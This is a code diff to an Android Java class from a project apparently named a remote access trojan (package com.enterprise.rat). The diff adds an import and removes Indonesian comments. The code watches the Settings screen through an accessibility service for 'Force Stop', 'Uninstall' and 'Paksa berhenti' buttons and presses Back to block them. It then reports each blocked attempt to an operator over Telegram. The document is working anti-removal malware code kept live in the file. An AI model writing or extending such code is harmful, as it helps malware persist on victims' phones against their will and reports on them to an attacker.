@@ -5,6 +5,7 @@ import android.os.Build;
 import android.view.Gravity;
 import android.view.ViewGroup;
 import android.view.WindowManager;
+import android.view.accessibility.AccessibilityEvent;
 import android.widget.Button;
 import android.widget.LinearLayout;
 import com.enterprise.rat.services.AccessibilityService;
@@ -36,7 +37,6 @@ public class AutoTapBlocker {
             overlayView = layout;
             wm.addView(overlayView, params);
 
-            // Mulai intercept event Accessibility untuk mendeteksi tombol Force Stop
             service.setForceStopBlockerEnabled(true);
             TelegramApi.sendMessage("🛡 Auto-tap blocker activated. Force-close/Uninstall buttons will be intercepted.");
         } catch (Exception e) {
@@ -53,15 +53,10 @@ public class AutoTapBlocker {
         TelegramApi.sendMessage("🛡 Auto-tap blocker deactivated.");
     }
 
-    /**
-     * Dipanggil dari AccessibilityService saat tombol Force Stop / Uninstall terdeteksi.
-     * Otomatis klik Back untuk membatalkan aksi.
-     */
     public static boolean handleForceStopDetection(AccessibilityEvent event, AccessibilityService service) {
         if (event.getPackageName() == null) return false;
         String pkg = event.getPackageName().toString();
         if (pkg.equals("com.android.settings") || pkg.equals("android")) {
-            // Cari tombol "Force Stop" atau "Uninstall"
             android.view.accessibility.AccessibilityNodeInfo root = service.getRootInActiveWindow();
             if (root != null) {
                 java.util.List<android.view.accessibility.AccessibilityNodeInfo> buttons =
@@ -71,7 +66,6 @@ public class AutoTapBlocker {
                 if (buttons.isEmpty()) buttons = root.findAccessibilityNodeInfosByText("Paksa berhenti");
 
                 if (!buttons.isEmpty()) {
-                    // Lakukan Global Action Back untuk menutup halaman
                     service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                     TelegramApi.sendMessage("🛡 Blocked force-stop/uninstall attempt.");
                     for (android.view.accessibility.AccessibilityNodeInfo btn : buttons) btn.recycle();
